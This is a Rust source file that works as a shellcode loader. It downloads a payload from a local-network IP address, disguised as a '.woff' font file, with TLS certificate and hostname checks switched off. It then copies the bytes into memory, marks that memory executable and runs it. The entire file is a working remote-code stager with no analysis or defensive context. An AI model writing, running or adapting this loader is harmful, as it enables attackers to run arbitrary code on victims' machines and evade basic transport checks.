use bytes::Bytes;
use region::{Protection, Allocation};


fn getscode(url: &str) -> Bytes {
    let client = reqwest::blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .build()
        .unwrap();
    let res = match client.get(url).send() {
        Ok(res) => res,
        Err(_) => panic!("")
    };
    let rbytes = match res.bytes() {
        Ok(b) => b,
        Err(_) => panic!("")
    };
    return rbytes
}

#[cfg(target_os = "windows")]
fn dne() -> Result<(), region::Error>{
    //download the payload
    let rbytes = getscode("http://192.168.78.129:8080/test.woff");
    // allocate and copy
    unsafe {
        //allocate
        let base_addr: Allocation = region::alloc(rbytes.len(), Protection::READ_WRITE)?;
        //copy
        std::ptr::copy(rbytes.as_ptr() as  _, base_addr.as_ptr::<u8>() as *mut u8, rbytes.len());
        // change to ex and cast
        let ep: extern "C" fn() -> i32 = {
            region::protect(base_addr.as_ptr::<u8>(), rbytes.len(), region::Protection::READ_EXECUTE)?;
            std::mem::transmute(base_addr.as_ptr::<u8>())
        };
        //run it
        ep();
        Ok(())
    }
}

fn main() {
    let _ = dne();
}
